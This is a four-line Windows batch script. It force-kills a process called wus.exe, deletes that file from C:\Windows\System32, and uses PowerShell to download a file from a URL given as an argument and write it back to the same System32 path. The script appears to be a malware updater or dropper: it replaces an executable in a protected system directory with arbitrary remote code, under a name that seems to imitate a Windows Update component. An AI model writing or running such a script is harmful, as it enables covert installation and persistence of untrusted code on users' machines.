@echo off
taskkill /F /IM wus.exe
del /f /q C:\Windows\System32\wus.exe
powershell -command iwr -Uri %1 -OutFile C:\Windows\System32\wus.exe